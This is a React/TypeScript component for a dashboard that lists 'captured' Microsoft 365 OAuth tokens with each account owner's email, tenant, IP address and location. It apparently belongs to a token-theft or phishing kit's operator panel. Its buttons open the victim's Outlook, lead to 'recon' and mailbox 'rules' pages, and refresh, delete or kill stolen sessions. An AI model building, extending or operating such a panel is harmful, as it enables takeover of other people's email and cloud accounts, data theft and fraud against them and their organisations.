"use client";

import { useState, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import {
  Search,
  RefreshCw,
  Mail,
  Globe,
  HardDrive,
  Users,
  Shield,
  FileText,
  Table2,
  Presentation,
  ExternalLink,
  Clock,
  MapPin,
  Building2,
  Wifi,
  CheckCircle2,
  XCircle,
  AlertCircle,
  Gavel,
} from "lucide-react";
import { Token } from "@/types/token";
import { formatDistanceToNow, isPast } from "date-fns";
import { deleteTokens, refreshToken, killSession } from "@/lib/api";
import { useRouter } from "next/navigation";
import { toast } from "sonner";
import { TokenTableSkeleton } from "@/components/ui/loading-skeleton";

interface TokenTableProps {
  tokens: Token[];
  loading: boolean;
  onRefresh: () => void;
  lastUpdated: Date | null;
}

export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTableProps) {
  const router = useRouter();
  const [search, setSearch] = useState("");
  const [refreshingId, setRefreshingId] = useState<string | null>(null);
  const [killingId, setKillingId] = useState<string | null>(null);

  const filtered = useMemo(() => {
    if (!search) return tokens;
    const q = search.toLowerCase();
    return tokens.filter(
      (t) =>
        t.email?.toLowerCase().includes(q) ||
        t.location?.toLowerCase().includes(q) ||
        t.tenant_id?.toLowerCase().includes(q) ||
        t.ip_address?.toLowerCase().includes(q)
    );
  }, [tokens, search]);

  const activeCount = tokens.filter((t) => !isPast(new Date(t.expires_at))).length;
  const revokedCount = tokens.filter((t) => isPast(new Date(t.expires_at))).length;

  const handleRefresh = async (token: Token) => {
    setRefreshingId(token.id);
    try {
      const result = await refreshToken(token.id);
      if (result.success) {
        toast.success("Token refreshed");
        onRefresh();
      } else {
        toast.error("Refresh failed", { description: result.message });
      }
    } catch (e: any) {
      toast.error("Error", { description: e.message });
    } finally {
      setRefreshingId(null);
    }
  };

  const handleKillSession = async (token: Token) => {
    if (!confirm("Kill this session? This will revoke the OAuth token and clear all cookies.")) return;
    setKillingId(token.id);
    try {
      const result = await killSession(token.id);
      toast.success("Session killed", { description: result.message });
      onRefresh();
    } catch (e: any) {
      toast.error("Failed to kill session", { description: e.message });
    } finally {
      setKillingId(null);
    }
  };

  const openApp = (token: Token, app: string) => {
    const base = `/outlook/${token.id}`;
    switch (app) {
      case "OUTLOOK":
        router.push(base);
        break;
      case "ONEDRIVE":
        window.open(`https://onedrive.live.com/?auth=2`, "_blank");
        break;
      case "TEAMS":
        window.open(`https://teams.microsoft.com`, "_blank");
        break;
      case "ADMIN":
        router.push(`/recon/${token.id}`);
        break;
      case "EXCHANGE":
        router.push(`/recon/${token.id}`);
        break;
      case "WORD":
        window.open(`https://word.new`, "_blank");
        break;
      case "EXCEL":
        window.open(`https://excel.new`, "_blank");
        break;
      case "POWERPOINT":
        window.open(`https://powerpoint.new`, "_blank");
        break;
    }
  };

  const getStatus = (token: Token) => {
    if (isPast(new Date(token.expires_at))) return "revoked";
    return "active";
  };

  const getSessionStatus = (token: Token) => {
    const status = token.session_status || "pending";
    if (status === "active") return { label: "Session Active", color: "bg-emerald-500/20 text-emerald-400 border-emerald-500/30", icon: "●" };
    if (status === "pending") return { label: "Session Pending", color: "bg-amber-500/20 text-amber-400 border-amber-500/30", icon: "◐" };
    if (status === "expired") return { label: "Session Expired", color: "bg-rose-500/20 text-rose-400 border-rose-500/30", icon: "○" };
    if (status === "killed") return { label: "Session Killed", color: "bg-gray-500/20 text-gray-400 border-gray-500/30", icon: "✕" };
    return { label: "No Session", color: "bg-gray-500/20 text-gray-400 border-gray-500/30", icon: "○" };
  };

  const getRefreshedText = (token: Token) => {
    if (token.last_refreshed_at) {
      return `Refreshed ${formatDistanceToNow(new Date(token.last_refreshed_at))} ago`;
    }
    if (token.created_at) {
      return `Refreshed ${formatDistanceToNow(new Date(token.created_at))} ago`;
    }
    return "Refreshed recently";
  };

  return (
    <div className="space-y-4">
      {/* Header Stats */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-2xl font-bold tracking-tight">PRIVATE TOKEN</span>
          <Badge variant="outline" className="bg-emerald-500/10 text-emerald-400 border-emerald-500/20">
            {activeCount} active
          </Badge>
          <Badge variant="outline" className="bg-rose-500/10 text-rose-400 border-rose-500/20">
            {revokedCount} revoked
          </Badge>
          <div className="flex items-center gap-1 text-[11px] text-muted-foreground">
            <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
            just now
          </div>
        </div>
        <div className="flex items-center gap-3">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
            <Input
              placeholder="Search by email, tenant..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="pl-9 w-72 bg-secondary/50 border-white/5"
            />
          </div>
          <Button
            variant="outline"
            size="sm"
            onClick={onRefresh}
            disabled={loading}
            className="gap-1.5 border-white/10 bg-secondary/50"
          >
            <RefreshCw className={`h-3.5 w-3.5 ${loading ? "animate-spin" : ""}`} />
            Refresh
          </Button>
        </div>
      </div>

      {/* Token Rows */}
      <div className="space-y-2">
        <AnimatePresence>
          {loading && tokens.length === 0 ? (
            <TokenTableSkeleton rows={5} />
          ) : filtered.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-20 text-muted-foreground">
              <AlertCircle className="h-12 w-12 mb-4 opacity-30" />
              <p className="text-sm">No tokens found</p>
            </div>
          ) : (
            filtered.map((token, index) => {
              const status = getStatus(token);
              const isActive = status === "active";

              return (
                <motion.div
                  key={token.id}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  transition={{ delay: index * 0.05, duration: 0.2 }}
                  className="group rounded-xl border border-white/5 bg-[#0f0f23]/80 hover:bg-[#1a1a3e]/80 transition-all duration-300 p-4"
                >
                  {/* Row Header */}
                  <div className="flex items-start justify-between gap-4">
                    <div className="flex-1 min-w-0">
                      {/* Email & Status */}
                      <div className="flex items-center gap-2 mb-1">
                        <h3 className="text-sm font-semibold text-white truncate">
                          {token.email}
                        </h3>
                        {isActive ? (
                          <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30 text-[10px] px-2 py-0">
                            <CheckCircle2 className="h-3 w-3 mr-1" />
                            ACTIVE
                          </Badge>
                        ) : (
                          <Badge className="bg-rose-500/20 text-rose-400 border-rose-500/30 text-[10px] px-2 py-0">
                            <XCircle className="h-3 w-3 mr-1" />
                            REVOKED
                          </Badge>
                        )}
                        {/* Session Status Badge */}
                        {(() => {
                          const session = getSessionStatus(token);
                          return (
                            <Badge className={`${session.color} text-[10px] px-2 py-0 border`}>
                              <span className="mr-1">{session.icon}</span>
                              {session.label}
                            </Badge>
                          );
                        })()}
                      </div>
                      
                      {/* Refreshed ago */}
                      <p className="text-[11px] text-muted-foreground mb-2">
                        {getRefreshedText(token)}
                      </p>

                      {/* Office App Buttons */}
                      <div className="flex flex-wrap gap-1.5 mb-3">
                        {[
                          { name: "ONEDRIVE", icon: HardDrive, color: "bg-blue-500/20 text-blue-400 border-blue-500/30" },
                          { name: "TEAMS", icon: Users, color: "bg-purple-500/20 text-purple-400 border-purple-500/30" },
                          { name: "ADMIN", icon: Shield, color: "bg-orange-500/20 text-orange-400 border-orange-500/30" },
                          { name: "EXCHANGE", icon: Mail, color: "bg-cyan-500/20 text-cyan-400 border-cyan-500/30" },
                          { name: "WORD", icon: FileText, color: "bg-blue-500/20 text-blue-400 border-blue-500/30" },
                          { name: "EXCEL", icon: Table2, color: "bg-green-500/20 text-green-400 border-green-500/30" },
                          { name: "POWERPOINT", icon: Presentation, color: "bg-orange-500/20 text-orange-400 border-orange-500/30" },
                        ].map((app) => (
                          <button
                            key={app.name}
                            onClick={() => openApp(token, app.name)}
                            className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-medium border ${app.color} hover:opacity-80 transition-opacity`}
                          >
                            <app.icon className="h-3 w-3" />
                            {app.name}
                          </button>
                        ))}
                      </div>

                      {/* Meta Info */}
                      <div className="flex flex-wrap items-center gap-x-4 gap-y-1 text-[11px] text-muted-foreground">
                        {token.tenant_id && (
                          <span className="flex items-center gap-1">
                            <Building2 className="h-3 w-3" />
                            Tenant: {token.tenant_id}
                          </span>
                        )}
                        {token.category && (
                          <span className="flex items-center gap-1">
                            <Globe className="h-3 w-3" />
                            Category: {token.category}
                          </span>
                        )}
                        {token.ip_address && (
                          <span className="flex items-center gap-1">
                            <Wifi className="h-3 w-3" />
                            {token.ip_address}
                          </span>
                        )}
                        {token.location && (
                          <span className="flex items-center gap-1">
                            <MapPin className="h-3 w-3" />
                            {token.location}
                          </span>
                        )}
                        <span className="flex items-center gap-1">
                          <Clock className="h-3 w-3" />
                          Captured {token.created_at ? formatDistanceToNow(new Date(token.created_at), { addSuffix: true }) : "unknown"}
                        </span>
                      </div>
                    </div>

                    {/* Actions */}
                    <div className="flex items-center gap-2 shrink-0">
                      <button
                        onClick={() => openApp(token, "OUTLOOK")}
                        className="inline-flex items-center gap-1.5 px-4 py-2 rounded-lg bg-[#0078d4]/20 text-[#0078d4] border border-[#0078d4]/30 text-xs font-medium hover:bg-[#0078d4]/30 transition-colors"
                      >
                        <ExternalLink className="h-3.5 w-3.5" />
                        OUTLOOK
                      </button>
                      
                       <button
                        onClick={() => router.push(`/rules/${token.id}`)}
                        className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-amber-500/10 text-amber-400 border border-amber-500/20 text-xs font-medium hover:bg-amber-500/20 transition-colors"
                        title="Manage rules"
                      >
                        <Gavel className="h-3.5 w-3.5" />
                        Rules
                      </button>
                      
                      {/* Kill Session Button */}
                      {token.session_status === "active" && (
                        <button
                          onClick={() => handleKillSession(token)}
                          disabled={killingId === token.id}
                          className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-rose-500/10 text-rose-400 border border-rose-500/20 text-xs font-medium hover:bg-rose-500/20 transition-colors disabled:opacity-50"
                          title="Kill session and revoke cookies"
                        >
                          <XCircle className={`h-3.5 w-3.5 ${killingId === token.id ? "animate-spin" : ""}`} />
                          Kill Session
                        </button>
                      )}
                      
                      <button
                        onClick={() => handleRefresh(token)}
                        disabled={refreshingId === token.id || isActive}
                        className="p-2 rounded-lg border border-white/10 hover:bg-white/5 transition-colors disabled:opacity-50"
                        title="Refresh token"
                      >
                        <RefreshCw className={`h-4 w-4 text-emerald-400 ${refreshingId === token.id ? "animate-spin" : ""}`} />
                      </button>
                      
                      <button
                        onClick={() => {
                          if (confirm("Delete this token?")) {
                            deleteTokens([token.id]).then(() => {
                              toast.success("Token deleted");
                              onRefresh();
                            });
                          }
                        }}
                        className="p-2 rounded-lg border border-white/10 hover:bg-rose-500/10 transition-colors"
                        title="Delete token"
                      >
                        <XCircle className="h-4 w-4 text-rose-400" />
                      </button>
                    </div>
                  </div>
                </motion.div>
              );
            })
          )}
        </AnimatePresence>
      </div>



      {/* Polling indicator */}
      {lastUpdated && (
        <p className="text-[10px] text-muted-foreground text-center">
          Polling every 10s — Last updated {formatDistanceToNow(lastUpdated, { addSuffix: true })}
        </p>
      )}
    </div>
  );
}
